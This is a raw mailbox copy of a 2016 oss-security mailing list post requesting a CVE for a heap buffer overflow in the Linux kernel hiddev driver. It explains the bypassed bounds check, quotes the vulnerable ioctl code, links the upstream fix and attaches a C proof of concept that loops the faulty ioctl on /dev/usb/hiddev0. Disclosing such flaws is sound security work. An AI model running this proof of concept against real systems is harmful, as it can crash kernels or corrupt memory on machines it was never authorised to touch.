X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4906" "Saturday" "25" "June" "2016" "23:01:40" "-0600" "Scotty" "sbauer@plzdonthack.me" "<576F61B4.1020505@plzdonthack.me>" "168" "[oss-security] CVE Request: Linux kernel HID: hiddev buffer overflows" nil nil nil "6" "2016062605:01:40" "[oss-security] CVE Request: Linux kernel HID: hiddev buffer overflows" (number mark "U       sbauer@plzdo Jun 25  168/4906  " thread-indent "\"[oss-security] CVE Request: Linux kernel HID: hiddev buffer overflows\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32578 invoked by uid 550); 26 Jun 2016 05:21:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24218 invoked from network); 26 Jun 2016 05:02:00 -0000
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
From: Scotty <sbauer@plzdonthack.me>
Message-ID: <576F61B4.1020505@plzdonthack.me>
Date: Sat, 25 Jun 2016 23:01:40 -0600
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.8.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
 protocol="application/pgp-signature";
 boundary="og937guG5elBHjcl5m7Q0K3kliJaJuP21"
X-XM-SPF: eid=1bH2CY-0005or-Pz;;;mid=<576F61B4.1020505@plzdonthack.me>;;;hst=mx04.mta.xmission.com;;;ip=166.70.198.91;;;frm=sbauer@plzdonthack.me;;;spf=none
X-SA-Exim-Connect-IP: 166.70.198.91
X-SA-Exim-Mail-From: sbauer@plzdonthack.me
X-Spam-DCC: XMission; sa04 1397; Body=1 Fuz1=1 Fuz2=1 
X-Spam-Combo: ;oss-security@lists.openwall.com
X-Spam-Relay-Country: 
X-Spam-Timing: total 393 ms - load_scoreonly_sql: 0.06 (0.0%),
	signal_user_changed: 7 (1.8%), b_tie_ro: 4.4 (1.1%), parse: 1.95 (0.5%),
	extract_message_metadata: 7 (1.9%), get_uri_detail_list: 1.95 (0.5%),
	tests_pri_-1000: 3.1 (0.8%), tests_pri_-950: 1.28 (0.3%), tests_pri_-900:
	1.02 (0.3%), tests_pri_-400: 26 (6.6%), check_bayes: 25 (6.3%), b_tokenize: 7
	(1.7%), b_tok_get_all: 8 (2.1%), b_comp_prob: 2.4 (0.6%), b_tok_touch_all:
	4.8 (1.2%), b_finish: 0.75 (0.2%), tests_pri_0: 331 (84.4%),
	check_dkim_signature: 0.60 (0.2%), check_dkim_adsp: 5 (1.3%), tests_pri_500:
	8 (2.0%), rewrite_mail: 0.00 (0.0%)
X-SA-Exim-Version: 4.2.1 (built Wed, 24 Sep 2014 11:00:52 -0600)
X-SA-Exim-Scanned: Yes (on mx04.mta.xmission.com)
Subject: [oss-security] CVE Request: Linux kernel HID: hiddev buffer overflows

--og937guG5elBHjcl5m7Q0K3kliJaJuP21
Content-Type: multipart/mixed; boundary="q9U8X7jogs76jkUSDlWmjmCJ7tM8NNHRp"
From: Scotty <sbauer@plzdonthack.me>
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
Message-ID: <576F61B4.1020505@plzdonthack.me>
Subject: CVE Request: Linux kernel HID: hiddev buffer overflows

--q9U8X7jogs76jkUSDlWmjmCJ7tM8NNHRp
Content-Type: multipart/mixed;
 boundary="------------020600010108000102050702"

This is a multi-part message in MIME format.
--------------020600010108000102050702
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Good evening,

There is a small buffer overflow in the hiddev driver code which seems to h=
ave come due
to a re-factor of the driver in 2008-ish.

If a user-land process calls the hiddev ioctl with the HIDIOCGUSAGES or HID=
IOCSUSAGES command,
and passes a report id of HID_REPORT_ID_UNKNOWN it bypasses a series of bou=
nds checks. Later in
the code the attacker can loop on some controlled value and overwrite past =
the bounds of the
uref_multi array or the value array.


	switch (cmd) {
...
...
...
		case HIDIOCGUSAGES:
/* HEAP OVERFLOW, Attacker controls num_values */
			for (i =3D 0; i < uref_multi->num_values; i++)
				uref_multi->values[i] =3D
				    field->value[uref->usage_index + i];
			if (copy_to_user(user_arg, uref_multi,
					 sizeof(*uref_multi)))
				goto fault;
			goto goodreturn;
		case HIDIOCSUSAGES:
/* HEAP OVERFLOW, attacker controls num_values */
			for (i =3D 0; i < uref_multi->num_values; i++)
				field->value[uref->usage_index + i] =3D
				    uref_multi->values[i];
			goto goodreturn;
		}

The issue has been fixed upstream here:
https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=
=3D93a2001bdfd5376c3dc2158653034c20392d15c5

Attached is a PoC illustrating the issue.=20

Thank you.


--------------020600010108000102050702
Content-Type: text/x-csrc;
 name="usb_hiddev.c"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
 filename="usb_hiddev.c"

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <inttypes.h>

static const char *dev_name =3D "/dev/usb/hiddev0";

typedef uint32_t __u32;
typedef int32_t __s32;

#define HID_REPORT_ID_UNKNOWN 0xffffffff

#define HIDIOCGUSAGES           _IOWR('H', 0x13, struct hiddev_usage_ref_mu=
lti)
#define HIDIOCSUSAGES           _IOW('H', 0x14, struct hiddev_usage_ref_mul=
ti)

#define HID_REPORT_TYPE_INPUT   1
#define HID_REPORT_TYPE_OUTPUT  2
#define HID_REPORT_TYPE_FEATURE 3
#define HID_REPORT_TYPE_MIN     1
#define HID_REPORT_TYPE_MAX     3

struct hiddev_usage_ref {
         __u32 report_type;
         __u32 report_id;
         __u32 field_index;
         __u32 usage_index;
         __u32 usage_code;
         __s32 value;
};

#define HID_MAX_MULTI_USAGES 1024
struct hiddev_usage_ref_multi {
         struct hiddev_usage_ref uref;
         __u32 num_values;
         __s32 values[HID_MAX_MULTI_USAGES];
};


int main(void)
{
	int fd;
	struct hiddev_usage_ref_multi dev =3D { 0 };
	uint32_t report_type, usage_code;
	fd =3D open(dev_name, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with errno %s\n", dev_name, strerror(errno));
		return EXIT_FAILURE;
	}

	dev.num_values =3D 12345679;
	dev.uref.report_id =3D HID_REPORT_ID_UNKNOWN;

	for (report_type =3D 1; report_type < HID_REPORT_TYPE_MAX; report_type++) {
		dev.uref.report_type =3D report_type;
		for (usage_code =3D 0; usage_code < 0xFFFFFFF; usage_code++) {
			dev.uref.usage_code =3D usage_code;
			ioctl(fd, HIDIOCGUSAGES, &dev);
		}
	}
	return EXIT_FAILURE;
}

--------------020600010108000102050702--

--q9U8X7jogs76jkUSDlWmjmCJ7tM8NNHRp--

--og937guG5elBHjcl5m7Q0K3kliJaJuP21
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.22 (GNU/Linux)

iQIcBAEBAgAGBQJXb2G5AAoJEAe5Q3+PjGSj8YkP/Apa5VC9DsymapXZhHg+Msl9
RR+wtIFdXw5/CHKNW2RG29qpOxZUQoi7owkN4HtQnHOKfYklpTw/a178PtPLr2BV
QiA4Kw4rQag3Q+vG6n2D+DwmfxxSern39fEOUGCsEd8tegoB20DzDcqmydgUcnVR
SpJfb/iRG6eqqdb9aVuG9NrdF3MoPgq/KeNbGf6mJDgdYhlniTCDgCrQgIwuNSoh
Wo+IvE53B7/Cv5NtRY5tvpnwHZnSrxWhIgWe8NAnaPqHCLlj2/H3JLhXUIU8U1UR
1zY+az3S9yIWA9e/7g5kJFAlRarzgsnk/lzrUgt1WCgpfvgx6oSnfdyWgTHtABaE
QIzUnKJn7SzHOQ4fE/09LOX81F6+UHbSGBsdOgpxQhVPlotgT6HO0pDk8RqNaEFm
oab1dRs1HR53/rkeyj/FRad2JF6jqW+iDNcSmd/Gk1oB/qbkmWauP3NdyGZRVtWn
sFtMqp7HnhB8yh1zxyRE2yh2Cx1F4Qg+UABcLk329IOnck9J6GJbj+DAJ13QLuv5
b+RZzA7NvEDTJr3C77i77boxMVWSmnl0yHRDAR5S7WefK8yxT8XnmSYisZIone1l
S9H+OO74KoZ3d4PkEGS9rjtIrjlvN4r11Bjggx/ZwGVdkdmwLDyzo5Iu+/vPZ8sF
dwO3nkUy0vhxjVyFwaGN
=veWy
-----END PGP SIGNATURE-----

--og937guG5elBHjcl5m7Q0K3kliJaJuP21--
